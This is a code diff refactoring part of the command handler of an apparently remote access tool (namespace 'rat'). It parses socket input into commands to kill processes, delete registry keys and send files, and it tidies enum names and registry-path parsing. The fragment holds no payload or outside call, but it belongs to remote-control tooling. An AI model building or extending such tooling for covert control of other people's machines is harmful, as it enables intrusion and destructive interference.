@@ -1,3 +1,5 @@
+#pragma once
+
 #include "clientcmd.h"
 
 namespace rat
@@ -16,6 +18,7 @@ ClientCmd::ClientCmd(const TcpSocket& socket, const char* input, int size)
 
 void ClientCmd::HandleInput(const char* input, int size)
 {
+    using enum rat::Command::CommandType;
     // Get address and port here in input;
 
     SetType(-1);
@@ -26,22 +29,22 @@ void ClientCmd::HandleInput(const char* input, int size)
     {
         return;
     }
-    if (int type = *((int *)(input + 4)); type == static_cast<int>(rat::Command::CommandType::kClientKillPid))
+    if (int type = *((int *)(input + 4)); type == static_cast<int>(kClientKillPid))
     {
-        SetType(static_cast<int>(rat::Command::CommandType::kClientKillPid));
+        SetType(static_cast<int>(kClientKillPid));
     }
-    else if (type == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
+    else if (type == static_cast<int>(kClientKillProcessName))
     {
-        SetType(static_cast<int>(rat::Command::CommandType::kClientKillProcessName));
+        SetType(static_cast<int>(kClientKillProcessName));
     }
-    else if (type == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
+    else if (type == static_cast<int>(kClientDeleteRegistry))
     {
-        SetType(static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry));
+        SetType(static_cast<int>(kClientDeleteRegistry));
     }
     #ifdef _WIN32
-    else if (type == static_cast<int>(rat::Command::CommandType::kClientSendFile))
+    else if (type == static_cast<int>(kClientSendFile))
     {
-        SetType(static_cast<int>(rat::Command::CommandType::kClientSendFile));
+        SetType(static_cast<int>(kClientSendFile));
     }
     #endif
     if (GetType() != -1)
@@ -78,7 +81,7 @@ bool ClientCmd::execute()
             std::stringstream ss(arg);
             std::string root_hkey_name;
             std::string sub_key_name;
-            ss >> root_hkey_name;
+            ss >> root_hkey_name >> std::ws;
             std::getline(ss, sub_key_name);
             Registry r(root_hkey_name, sub_key_name);
             return r.DeleteSelf();
